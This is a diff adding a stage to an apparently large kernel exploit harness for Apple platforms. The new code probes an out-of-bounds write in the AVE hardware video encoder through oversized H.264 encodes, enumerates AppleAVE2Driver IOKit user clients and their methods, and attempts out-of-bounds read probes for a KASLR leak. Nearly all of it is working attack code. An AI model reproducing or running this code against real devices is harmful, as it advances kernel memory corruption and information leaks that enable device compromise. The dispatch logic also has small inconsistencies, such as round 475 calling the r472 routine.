@@ -17977,6 +17977,266 @@ static void *r471_osc_thread(void *arg) {
     return NULL;
 }
 
+/* ============================================================
+ * r472: AVEVideoEncoder OOB probe
+ *
+ * Tests CVE-2026-112705 / CVE-2026-112689 trigger path:
+ * H.264 VTCompressionSession at large resolutions, BGRA pixel
+ * buffer without IOSurface backing.  We probe multiple resolutions
+ * to find the OOB boundary — where the hardware encoder's DMA
+ * write exceeds the allocated buffer — without immediately
+ * triggering a DART page-fault panic.
+ *
+ * Phase A: Safe baseline (small res) — confirm encode works
+ * Phase B: Resolution sweep — find max safe / min crash boundary
+ * Phase C: IOKit AVE2 user client enumeration
+ * Phase D: Attempt controlled OOB with heap spray
+ * ============================================================ */
+static void r472_ave_encode_cb(void *ctx, void *src, OSStatus st,
+                                VTEncodeInfoFlags flags, CMSampleBufferRef buf) {
+    int *done = (int *)ctx;
+    if (done) *done = 1;
+    rlog("    encode_cb: st=%d flags=0x%x buf=%p\n", (int)st, (unsigned)flags, (void *)buf);
+}
+
+static int r472_try_encode(int width, int height, int codec_h264, int use_iosurface) {
+    rlog("  try_encode: %dx%d codec=%s iosurf=%d\n",
+         width, height, codec_h264 ? "H264" : "HEVC", use_iosurface);
+    fflush(stdout);
+
+    CMVideoCodecType codec = codec_h264 ?
+        kCMVideoCodecType_H264 : kCMVideoCodecType_HEVC;
+
+    CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(
+        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFDictionarySetValue(enc_spec, CFSTR("EnableHardwareAcceleratedVideoEncoder"),
+                         kCFBooleanTrue);
+    CFDictionarySetValue(enc_spec, CFSTR("RequireHardwareAcceleratedVideoEncoder"),
+                         kCFBooleanTrue);
+
+    int done_flag = 0;
+    VTCompressionSessionRef session = NULL;
+    OSStatus st = VTCompressionSessionCreate(NULL, width, height,
+        codec, enc_spec, NULL, NULL,
+        r472_ave_encode_cb, &done_flag, &session);
+    CFRelease(enc_spec);
+
+    if (st != noErr || !session) {
+        rlog("    create FAILED: st=%d\n", (int)st);
+        return -1;
+    }
+
+    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+    int kf = 1;
+    CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
+    VTSessionSetProperty(session, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
+    CFRelease(kfn);
+    VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);
+
+    st = VTCompressionSessionPrepareToEncodeFrames(session);
+    rlog("    prepare: st=%d\n", (int)st);
+    if (st != noErr) {
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+        return -2;
+    }
+
+    CVPixelBufferRef pb = NULL;
+    if (use_iosurface) {
+        CFMutableDictionaryRef pb_attrs = CFDictionaryCreateMutable(
+            NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFDictionarySetValue(pb_attrs, kCVPixelBufferIOSurfacePropertiesKey,
+            CFDictionaryCreate(NULL, NULL, NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks));
+        CVReturn cr = CVPixelBufferCreate(NULL, width, height,
+            kCVPixelFormatType_32BGRA, pb_attrs, &pb);
+        CFRelease(pb_attrs);
+        if (cr != kCVReturnSuccess || !pb) {
+            rlog("    pixbuf create FAILED (iosurf): %d\n", (int)cr);
+            VTCompressionSessionInvalidate(session);
+            CFRelease(session);
+            return -3;
+        }
+    } else {
+        CVReturn cr = CVPixelBufferCreate(NULL, width, height,
+            kCVPixelFormatType_32BGRA, NULL, &pb);
+        if (cr != kCVReturnSuccess || !pb) {
+            rlog("    pixbuf create FAILED: %d\n", (int)cr);
+            VTCompressionSessionInvalidate(session);
+            CFRelease(session);
+            return -3;
+        }
+    }
+
+    CVPixelBufferLockBaseAddress(pb, 0);
+    void *base = CVPixelBufferGetBaseAddress(pb);
+    size_t alloc = CVPixelBufferGetDataSize(pb);
+    rlog("    pixbuf: base=%p alloc=%zu (%zu KB)\n", base, alloc, alloc / 1024);
+    if (base) memset(base, 0x41, alloc < (256ULL*1024*1024) ? alloc : (256ULL*1024*1024));
+    CVPixelBufferUnlockBaseAddress(pb, 0);
+
+    CMTime pts = CMTimeMake(0, 30);
+    rlog("    encoding frame...\n");
+    fflush(stdout);
+
+    st = VTCompressionSessionEncodeFrame(session, pb, pts, kCMTimeInvalid,
+                                          NULL, NULL, NULL);
+    rlog("    encode: st=%d\n", (int)st);
+
+    if (st == noErr) {
+        st = VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
+        rlog("    complete: st=%d done=%d\n", (int)st, done_flag);
+    }
+
+    CVPixelBufferRelease(pb);
+    VTCompressionSessionInvalidate(session);
+    CFRelease(session);
+
+    rlog("    => survived (no panic)\n");
+    return (int)st;
+}
+
+static void r472_exploit(void) {
+    rlog("\n=== r472: AVEVideoEncoder OOB Probe ===\n");
+    rlog("Target: CVE-2026-112705/112689 (OOB write in AVE H.264 encoder)\n");
+    rlog("Technique: Large-resolution H.264 encode with BGRA pixel buffer\n\n");
+    fflush(stdout);
+
+    /* Phase A: Safe baseline — confirm encode works at normal resolution */
+    rlog("--- Phase A: Safe baseline encode ---\n");
+    int r = r472_try_encode(1920, 1080, 1, 0);
+    rlog("  1920x1080 H264 no-iosurf: %d\n\n", r);
+    r = r472_try_encode(1920, 1080, 1, 1);
+    rlog("  1920x1080 H264 w/iosurf: %d\n\n", r);
+    r = r472_try_encode(1920, 1080, 0, 0);
+    rlog("  1920x1080 HEVC no-iosurf: %d\n\n", r);
+    fflush(stdout);
+
+    /* Phase B: Resolution sweep — find the boundary */
+    rlog("--- Phase B: Resolution sweep (H264, no IOSurface) ---\n");
+    rlog("  Looking for max safe resolution before DART fault...\n\n");
+
+    struct { int w; int h; const char *label; } sizes[] = {
+        { 4096,  2160, "4K" },
+        { 8192,  4096, "8K" },
+        { 8192,  8192, "8Kx8K" },
+        { 16384, 8192, "16Kx8K" },
+        { 16384, 16384, "16Kx16K (PoC guard)" },
+        { 20480, 16384, "20Kx16K" },
+        { 24576, 16384, "24Kx16K" },
+        { 28672, 16384, "28Kx16K" },
+        { 30720, 16384, "30Kx16K" },
+        { 32768, 16384, "32Kx16K (PoC trigger)" },
+    };
+    int nsizes = sizeof(sizes) / sizeof(sizes[0]);
+
+    for (int i = 0; i < nsizes; i++) {
+        rlog("  [%d/%d] %s (%dx%d):\n", i + 1, nsizes, sizes[i].label,
+             sizes[i].w, sizes[i].h);
+        fflush(stdout);
+        r = r472_try_encode(sizes[i].w, sizes[i].h, 1, 0);
+        rlog("  => result: %d\n\n", r);
+        fflush(stdout);
+        if (r < -2) {
+            rlog("  ** Pixel buffer creation failed — skipping larger sizes\n");
+            break;
+        }
+    }
+
+    /* Phase B2: Test with IOSurface-backed buffers (PoC says no repro) */
+    rlog("--- Phase B2: IOSurface-backed comparison ---\n");
+    r = r472_try_encode(32768, 16384, 1, 1);
+    rlog("  32768x16384 H264 w/iosurf: %d\n\n", r);
+    r = r472_try_encode(32768, 16384, 0, 0);
+    rlog("  32768x16384 HEVC no-iosurf: %d\n\n", r);
+    fflush(stdout);
+
+    /* Phase C: AVE2 IOKit user client enumeration */
+    rlog("--- Phase C: AVE2 IOKit user client ---\n");
+    fflush(stdout);
+
+    io_service_t ave_svc = IOServiceGetMatchingService(
+        kIOMainPortDefault,
+        IOServiceMatching("AppleAVE2Driver"));
+    rlog("  AppleAVE2Driver service: 0x%x\n", ave_svc);
+
+    if (!ave_svc) {
+        ave_svc = IOServiceGetMatchingService(
+            kIOMainPortDefault,
+            IOServiceMatching("AppleAVE2DriverV2"));
+        rlog("  AppleAVE2DriverV2 service: 0x%x\n", ave_svc);
+    }
+
+    if (ave_svc) {
+        for (uint32_t type = 0; type <= 7; type++) {
+            io_connect_t conn = 0;
+            kern_return_t kr = IOServiceOpen(ave_svc, mach_task_self(), type, &conn);
+            rlog("  type=%u: kr=%d (0x%x) conn=0x%x\n", type, kr, kr, conn);
+            if (kr == KERN_SUCCESS && conn) {
+                /* Probe external methods 0-20 with NULL args */
+                for (uint32_t sel = 0; sel <= 20; sel++) {
+                    uint64_t out[4] = {0};
+                    uint32_t outcnt = 4;
+                    kr = IOConnectCallScalarMethod(conn, sel, NULL, 0, out, &outcnt);
+                    if (kr != 0xe00002c2) { /* Skip kIOReturnBadArgument */
+                        rlog("    sel=%u: kr=0x%x out[0]=0x%llx cnt=%u\n",
+                             sel, kr, out[0], outcnt);
+                    }
+                }
+
+                /* Check for mapped memory */
+                for (uint32_t mem_type = 0; mem_type <= 5; mem_type++) {
+                    mach_vm_address_t addr = 0;
+                    mach_vm_size_t size = 0;
+                    kr = IOConnectMapMemory64(conn, mem_type, mach_task_self(),
+                                              &addr, &size, kIOMapAnywhere);
+                    if (kr == KERN_SUCCESS) {
+                        rlog("    mem_type=%u: addr=0x%llx size=0x%llx (%llu KB)\n",
+                             mem_type, (uint64_t)addr, (uint64_t)size, (uint64_t)size/1024);
+                        IOConnectUnmapMemory64(conn, mem_type, mach_task_self(), addr);
+                    } else if (kr != 0xe00002c2 && kr != 0xe00002bc) {
+                        rlog("    mem_type=%u: kr=0x%x\n", mem_type, kr);
+                    }
+                }
+
+                IOServiceClose(conn);
+            }
+            fflush(stdout);
+        }
+        IOObjectRelease(ave_svc);
+    }
+
+    /* Phase D: OOB read probe — try to read kernel memory via encoder feedback */
+    rlog("\n--- Phase D: OOB read probe (KASLR leak attempt) ---\n");
+    rlog("  Attempting encode with crafted dimensions for info leak...\n");
+    fflush(stdout);
+
+    /* Try resolutions that might cause a small OOB read (CVE-2026-112466) */
+    /* The idea: if the encoder reads slightly past buffer bounds during
+     * motion estimation or reference frame handling, leaked data may
+     * appear in the compressed output */
+    struct { int w; int h; } read_probes[] = {
+        { 16400, 16384 },  /* 16 pixels over alignment */
+        { 16384, 16400 },
+        { 16385, 16384 },  /* 1 pixel over */
+        { 16384, 16385 },
+        { 17408, 16384 },  /* 1024 over */
+        { 16384, 17408 },
+    };
+    int nread = sizeof(read_probes) / sizeof(read_probes[0]);
+
+    for (int i = 0; i < nread; i++) {
+        rlog("  OOB-read probe %dx%d:\n", read_probes[i].w, read_probes[i].h);
+        fflush(stdout);
+        r = r472_try_encode(read_probes[i].w, read_probes[i].h, 1, 0);
+        rlog("  => %d\n\n", r);
+        fflush(stdout);
+    }
+
+    rlog("\n=== r472 complete ===\n");
+    fflush(stdout);
+}
+
 static void r471_exploit(void) {
     rlog("\n=== r471: 8-page IOSurface + large IOV TOCTOU ===\n\n");
     fflush(stdout);
@@ -88048,6 +88308,12 @@ new_modes:
             r472_exploit();
             goto done;
         }
+        if (rounds == 475) {
+            rlog("*** rounds=475: AVEVideoEncoder OOB probe ***\n\n");
+            fflush(stdout);
+            r472_exploit();
+            goto done;
+        }
         if (rounds == 474) {
             rlog("*** rounds=474: 8-page IOSurface + large IOV TOCTOU ***\n\n");
             fflush(stdout);
@@ -90913,7 +91179,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
